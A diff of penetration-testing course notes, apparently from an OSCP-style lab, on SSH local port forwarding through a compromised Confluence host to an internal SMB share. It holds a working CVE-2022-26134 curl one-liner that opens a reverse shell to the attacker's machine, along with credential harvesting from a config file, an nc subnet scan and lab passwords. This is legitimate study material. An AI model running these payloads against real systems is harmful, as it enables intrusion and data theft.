@@ -22,7 +22,7 @@ As it stands KALI is in the WAN, PGDATABASE01 is in the DMZ, and CONFLUENCE01 is
 CONFLUENCE01 is listening on port 8090
 PGDATABASE01 is listening on port 5432 - (likely a PostgreSQL server's default port)
 
-#### Lab Env Setup
+#### Breakdown
 
 To gain access to CONFLUENCE01, we'll need to leverage the RCE vuln in the Confluence web app to get a revshell
 
@@ -228,6 +228,239 @@ ssh database_admin@192.168.247.63 -p 2222
 
 
 # SSH Tunneling
+aka SSH Port Forwarding
+
+Encapsulating one kind of data stream within another as it travels across a network.
+
+Benefits:
+- Primarily a tunneling protocol, so it's possible to pass almost any kind of data through an SSH connection.
+- Easily blends into the background traffic of network envs
+- Often used by network admins for legitimate remote admin purposes
+- Flexible port forwarding setups in restrictive network situations
+- Common to find client software (or even SSH servers) already installed
+- Contents cannot easily be monitored
+
+Difference from previous Port Forwarding:
+- Listening and Forwarding were done on the *same endpoint*
+- SSH Tunneling
+	- SSH connection is made between two endpoints
+	- Listening port is opened by the *SSH client*
+	- Packets are tunneled through the listening port to the *SSH server*
+	- Packets are then forwarded through the server by the socket we specify
+
+
+## Local Port Forward
+#### Scenario
+- Socat isn't available on CONFLUENCE01
+- Still have creds cracked from the *confluence* database
+- Still no firewall blocking the port we bind to
+- Log into PGDATABASE01 with the _database_admin_ creds & see it's attached to another internal subnet (*ip addr,  routel*)
+- Find a host w/ SMB server open (445) in that newly discovered subnet
+- CONFLUENCE01 - **192.168.163.63**
+- PGDATABASE01 - **10.4.163.215**
+- HRSHARES - **172.16.163.217**
+
+
+#### Execution
+- Create an SSH port forward from  CONFLUENCE01 to PGDATABASE01
+- Bind to a listening port on the WAN interface of CONFLUENCE01
+- All packets sent to that port will be forwarded through the SSH tunnel to PGDATABASE01
+- PGDATABASE01 will then forward these packets toward the SMB port on the newly discovered host
+
+![](ssh-tunnel.new.png)
+
+#### Breakdown
+
+- As before, get a shell on CONFLUENCE01 using the cURL one-liner exploit for CVE-2022-26134
+```bash
+curl -v http://[CONFLUENCE01_IP]:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/[KALI_IP]/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+
+
+- Knowing it's a Confluence server, check the configuration file
+```bash
+confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+	...
+	    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>                           #<-- NOTE password
+	    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>    #<-- NOTE address/ port
+	    <property name="hibernate.connection.username">postgres</property>                                    #<-- NOTE username
+	...
+```
+
+
+> In order to SSH directly from CONFLUENCE01 to PGDATABASE01 we'll need to discover exactly which IP address and port we want the packets forwarded to
+
+- Ensure that confluence shell has [TTY](Fully%20Interactive%20TTY.md) functionality
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# IF a Permission Denied error message occurs, try:
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+> For demonstration purposes, we're assuming we got the *database_admin* creds another way.
+
+- From the reverse shell
+```bash
+ssh database_admin@10.4.163.215
+	database_admin@10.4.163.215's password: sqlpass123
+```
+
+- Enumerate
+```bash
+ip addr
+	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+	    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+	    inet 127.0.0.1/8 scope host lo
+	       valid_lft forever preferred_lft forever
+	    inet6 ::1/128 scope host 
+	       valid_lft forever preferred_lft forever
+	4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+	    link/ether 00:50:56:bf:53:6e brd ff:ff:ff:ff:ff:ff
+	    inet 10.4.163.215/24 brd 10.4.163.255 scope global ens192
+	       valid_lft forever preferred_lft forever
+	5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+	    link/ether 00:50:56:bf:e7:13 brd ff:ff:ff:ff:ff:ff
+	    inet 172.16.163.254/24 brd 172.16.163.255 scope global ens224
+	       valid_lft forever preferred_lft forever
+
+ip route
+	default via 10.4.163.254 dev ens192 proto static
+	10.4.163.0/24 dev ens192 proto kernel scope link src 10.4.163.215 
+	172.16.163.0/24 dev ens224 proto kernel scope link src 172.16.163.254    #<--NOTE
+```
+
+- Use **nc** to scan for possible hosts
+```bash
+for i in $(seq 1 254); do nc -zv -w 1 172.16.163.$i 445 2>&1 | grep succeeded; done
+	Connection to 172.16.163.217 445 port [tcp/microsoft-ds] succeeded!
+```
+
+> Now, in order to download anything discovered from that SMB share to our Kali machine, we'd either have to
+1. Use whatever built-in tools we find on PGDATABASE01, download info to PGDATABASE01, then transfer back to CONFLUENCE01, *then* back to Kali
+2. Create an SSH connection from CONFLUENCE01 to PGDATABASE01 utilizing a local port forward which would listen on port 4455 on the WAN interface of CONFLUENCE01, forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share.
+
+
+- Kill the SSH connection to PGDATABASE01
+```bash
+ps aux | grep ssh
+	root         880  0.0  0.3  12172  7272 ?        Ss   May20   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+	root        6115  0.0  0.4  13916  9020 ?        Ss   00:43   0:00 sshd: database_admin [priv]
+	databas+    6218  0.0  0.2  14052  5284 ?        S    00:43   0:00 sshd: database_admin@pts/0      #<-- NOTE
+	root        9019  0.0  0.4  13920  9048 ?        Ss   01:05   0:00 sshd: database_admin [priv]
+	databas+    9112  0.0  0.2  14052  5944 ?        S    01:05   0:00 sshd: database_admin@pts/1      #<-- NOTE
+	databas+   10429  0.0  0.0   6300   720 pts/1    S+   01:19   0:00 grep --color=auto ssh
+
+kill -9 6218
+	-bash: kill: (9) - Operation not permitted
+
+ps aux | grep ssh
+	root         880  0.0  0.3  12172  7272 ?        Ss   May20   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+	root        9019  0.0  0.4  13920  9048 ?        Ss   01:05   0:00 sshd: database_admin [priv]
+	databas+    9112  0.0  0.2  14052  5944 ?        S    01:05   0:00 sshd: database_admin@pts/1
+	databas+   10563  0.0  0.0   6300   656 pts/1    S+   01:21   0:00 grep --color=auto ssh
+
+kill -9 9112
+	Connection to 10.4.163.215 closed by remote host.
+	Connection to 10.4.163.215 closed.
+
+$ whoami
+	confluence
+```
+
+- Setup a new connection to establish an SSH connection w/ args for a local port forward
+```bash
+ssh -N -L 0.0.0.0:4455:172.16.163.217:445 database_admin@10.4.163.215
+```
+	-L - Local port forward.  Takes args as two sockets:
+	IP:PORT:IP:PORT - First socket is listening socket bound to the SSH client machine.  Second socket is where we want to forward the packets to.
+	database_admin@10.4.163.215 - Rest of the SSH command is as usual; pointed at the SSH server and user we wish to connect as.
+
+> If done correctly, after providing the SSH creds for database_admin, there'll be no output & it'll look like it's hanging
+
+
+- Since this reverse shell from CONFLUENCE01 is now occupied with an open SSH session, we need to catch another reverse shell from CONFLUENCE01.
+	- We can do this by listening on another port and modifying our CVE-2022-26134 payload to return a shell to that port.
+```bash
+# Kali tab 1
+nc -nlvp 4444
+
+# Kali tab 2
+curl -v http://192.168.163.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.154/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+
+- Confirm SSH process on CONFLUENCE01
+```bash
+ss -ntplu
+	Netid  State   Recv-Q  Send-Q         Local Address:Port     Peer Address:Port  Process                                                                 ...
+	tcp    LISTEN  0       128                  0.0.0.0:4455          0.0.0.0:*      users:(("ssh",pid=5825,fd=4))                                          ...
+```
+
+![](ssh-tunnel.new1.png)
+
+- From Kali, list available shares via **smbclient** & download files
+```bash
+smbclient -p 4455 -L //192.168.163.63/ -U hr_admin --password=Welcome1234
+	Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk
+
+smbclient -p 4455 //192.168.163.63/Scripts -U hr_admin --password=Welcome1234
+	Try "help" to get a list of possible commands.
+	smb: \> ls
+	  .                                   D        0  Tue Sep 13 04:37:59 2022
+	  ..                                 DR        0  Tue Sep  6 11:02:37 2022
+	  Provisioning.ps1                   AR     1806  Mon May 20 19:35:04 2024
+
+	smb: \> get Provisioning.ps1
+		getting file \Provisioning.ps1 of size 1806 as Provisioning.ps1 (7.1 KiloBytes/sec) (average 7.1 KiloBytes/sec)
+
+
+cat Provisioning.ps1 
+	��<# 
+	This script will create the flag_admin user and set the flag as the password.
+	WARNING: Do not run this in production using system account.
+	Last update: September 12, 2022
+	Last Updated By: Alice Admin
+	Duration: Unknown
+	Output: User created
+	#>
+	
+	#Requires -RunAsAdministrator
+	
+	$Flag="OS{9cb81c7a0a2428927386732978ebe2c3}";
+	
+	$SecurePassword = $Flag | ConvertTo-SecureString -AsPlainText -Force
+	
+	try {
+	    Write-Output "Searching for $Username in LocalUser DataBase"
+	    $UserAccount = Get-LocalUser $Username
+	    Write-Warning "$Username already exists, just going to reset password."                                               
+	    $UserAccount | Set-LocalUser -Password $SecurePassword                                                                
+	} catch [Microsoft.PowerShell.Commands.UserNotFoundException] {                                                           
+	    Write-Output "$Username not found, creating the whole user."                                                          
+	    New-LocalUser $Username -Password $SecurePassword -FullName "FLAG USER" -Description "Flag User"
+```
+
+
+
+## Dynamic Port Forward
+#### Scenario
+- Socat isn't available on CONFLUENCE01
+- Still have creds cracked from the *confluence* database
+- Still no firewall blocking the port we bind to
+- Log into PGDATABASE01 with the _database_admin_ creds & see it's attached to another internal subnet (*ip addr,  routel*)
+- Find a host w/ SMB server open (445) in that newly discovered subnet
+- CONFLUENCE01 - **192.168.163.63**
+- PGDATABASE01 - **10.4.163.215**
+- HRSHARES - **172.16.163.217**
+
+
+#### Execution
 
 
 
@@ -242,10 +475,7 @@ ssh database_admin@192.168.247.63 -p 2222
 
 
 
-
-
-
-
+# Removed from course
 
 ### RINETD:
 
@@ -275,7 +505,7 @@ nc -nvv 192.168.119.126 80
 
 
 
-### SSH Tunneling:
+### SSH Tunneling_old:
 ![[tunneling.png]]
 
 Most popular for tunneling and port forwarding.  
